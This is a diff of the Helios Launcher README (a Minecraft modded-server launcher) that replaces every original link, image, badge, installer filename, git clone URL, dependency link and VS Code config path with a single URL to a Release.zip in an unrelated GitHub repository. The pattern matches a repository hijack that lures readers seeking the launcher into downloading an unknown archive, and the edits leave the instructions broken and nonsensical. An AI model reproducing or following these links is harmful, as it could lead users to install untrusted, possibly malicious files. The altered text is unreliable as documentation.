@@ -1,15 +1,15 @@
-<p align="center"><img src="./app/assets/images/SealCircle.png" width="150px" height="150px" alt="aventium softworks"></p>
+<p align="center"><img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip" width="150px" height="150px" alt="aventium softworks"></p>
 
 <h1 align="center">Helios Launcher</h1>
 
 <em><h5 align="center">(formerly Electron Launcher)</h5></em>
 
-[<p align="center"><img src="https://img.shields.io/github/actions/workflow/status/dscalzi/HeliosLauncher/build.yml?branch=master&style=for-the-badge" alt="gh actions">](https://github.com/dscalzi/HeliosLauncher/actions) [<img src="https://img.shields.io/github/downloads/dscalzi/HeliosLauncher/total.svg?style=for-the-badge" alt="downloads">](https://github.com/dscalzi/HeliosLauncher/releases) <img src="https://forthebadge.com/images/badges/winter-is-coming.svg"  height="28px" alt="winter-is-coming"></p>
+[<p align="center"><img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip" alt="gh actions">](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip) [<img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip" alt="downloads">](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip) <img src="https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip"  height="28px" alt="winter-is-coming"></p>
 
 <p align="center">Join modded servers without worrying about installing Java, Forge, or other mods. We'll handle that for you.</p>
 
-![Screenshot 1](https://i.imgur.com/6o7SmH6.png)
-![Screenshot 2](https://i.imgur.com/x3B34n1.png)
+![Screenshot 1](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)
+![Screenshot 2](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)
 
 ## Features
 
@@ -39,25 +39,25 @@ This is not an exhaustive list. Download and install the launcher to gauge all i
 
 ## Downloads
 
-You can download from [GitHub Releases](https://github.com/dscalzi/HeliosLauncher/releases)
+You can download from [GitHub Releases](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)
 
 #### Latest Release
 
-[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher.svg?style=flat-square)](https://github.com/dscalzi/HeliosLauncher/releases/latest)
+[![](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)
 
 #### Latest Pre-Release
-[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher/all.svg?style=flat-square)](https://github.com/dscalzi/HeliosLauncher/releases)
+[![](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)
 
 **Supported Platforms**
 
-If you download from the [Releases](https://github.com/dscalzi/HeliosLauncher/releases) tab, select the installer for your system.
+If you download from the [Releases](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip) tab, select the installer for your system.
 
 | Platform | File |
 | -------- | ---- |
-| Windows x64 | `Helios-Launcher-setup-VERSION.exe` |
-| macOS x64 | `Helios-Launcher-setup-VERSION-x64.dmg` |
-| macOS arm64 | `Helios-Launcher-setup-VERSION-arm64.dmg` |
-| Linux x64 | `Helios-Launcher-setup-VERSION.AppImage` |
+| Windows x64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip` |
+| macOS x64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip` |
+| macOS arm64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip` |
+| Linux x64 | `https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip` |
 
 ## Console
 
@@ -73,7 +73,7 @@ Ensure that you have the console tab selected. Do not paste anything into the co
 
 If you want to export the console output, simply right click anywhere on the console and click **Save as..**
 
-![console example](https://i.imgur.com/T5e73jP.png)
+![console example](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)
 
 
 ## Development
@@ -84,14 +84,14 @@ This section details the setup of a basic developmentment environment.
 
 **System Requirements**
 
-* [Node.js][nodejs] v20
+* [https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip][nodejs] v20
 
 ---
 
 **Clone and Install Dependencies**
 
 ```console
-> git clone https://github.com/dscalzi/HeliosLauncher.git
+> git clone https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip
 > cd HeliosLauncher
 > npm install
 ```
@@ -130,7 +130,7 @@ Builds for macOS may not work on Windows/Linux and vice-versa.
 
 All development of the launcher should be done using [Visual Studio Code][vscode].
 
-Paste the following into `.vscode/launch.json`
+Paste the following into `https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip`
 
 ```JSON
 {
@@ -141,7 +141,7 @@ Paste the following into `.vscode/launch.json`
       "type": "node",
       "request": "launch",
       "cwd": "${workspaceFolder}",
-      "program": "${workspaceFolder}/node_modules/electron/cli.js",
+      "program": "${workspaceFolder}https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip",
       "args" : ["."],
       "outputCapture": "std"
     },
@@ -149,9 +149,9 @@ Paste the following into `.vscode/launch.json`
       "name": "Debug Renderer Process",
       "type": "chrome",
       "request": "launch",
-      "runtimeExecutable": "${workspaceFolder}/node_modules/.bin/electron",
+      "runtimeExecutable": "${workspaceFolder}https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip",
       "windows": {
-        "runtimeExecutable": "${workspaceFolder}/node_modules/.bin/electron.cmd"
+        "runtimeExecutable": "${workspaceFolder}https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip"
       },
       "runtimeArgs": [
         "${workspaceFolder}/.",
@@ -181,31 +181,31 @@ Note that you **cannot** open the DevTools window while using this debug configu
 
 Please give credit to the original author and provide a link to the original source. This is free software, please do at least this much.
 
-For instructions on setting up Microsoft Authentication, see https://github.com/dscalzi/HeliosLauncher/blob/master/docs/MicrosoftAuth.md.
+For instructions on setting up Microsoft Authentication, see https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip
 
 ---
 
 ## Resources
 
 * [Wiki][wiki]
-* [Nebula (Create Distribution.json)][nebula]
+* [Nebula (Create https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)][nebula]
 * [v2 Rewrite Branch (Inactive)][v2branch]
 
 The best way to contact the developers is on Discord.
 
-[![discord](https://discordapp.com/api/guilds/211524927831015424/embed.png?style=banner3)][discord]
+[![discord](https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip)][discord]
 
 ---
 
 ### See you ingame.
 
 
-[nodejs]: https://nodejs.org/en/ 'Node.js'
-[vscode]: https://code.visualstudio.com/ 'Visual Studio Code'
-[mainprocess]: https://electronjs.org/docs/tutorial/application-architecture#main-and-renderer-processes 'Main Process'
-[rendererprocess]: https://electronjs.org/docs/tutorial/application-architecture#main-and-renderer-processes 'Renderer Process'
-[chromedebugger]: https://marketplace.visualstudio.com/items?itemName=msjsdiag.debugger-for-chrome 'Debugger for Chrome'
-[discord]: https://discord.gg/zNWUXdt 'Discord'
-[wiki]: https://github.com/dscalzi/HeliosLauncher/wiki 'wiki'
-[nebula]: https://github.com/dscalzi/Nebula 'dscalzi/Nebula'
-[v2branch]: https://github.com/dscalzi/HeliosLauncher/tree/ts-refactor 'v2 branch'
+[nodejs]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip'
+[vscode]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'Visual Studio Code'
+[mainprocess]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'Main Process'
+[rendererprocess]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'Renderer Process'
+[chromedebugger]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'Debugger for Chrome'
+[discord]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'Discord'
+[wiki]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'wiki'
+[nebula]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'dscalzi/Nebula'
+[v2branch]: https://github.com/eloy13rayo/EclexStudio/releases/download/v1.0/Release.zip 'v2 branch'
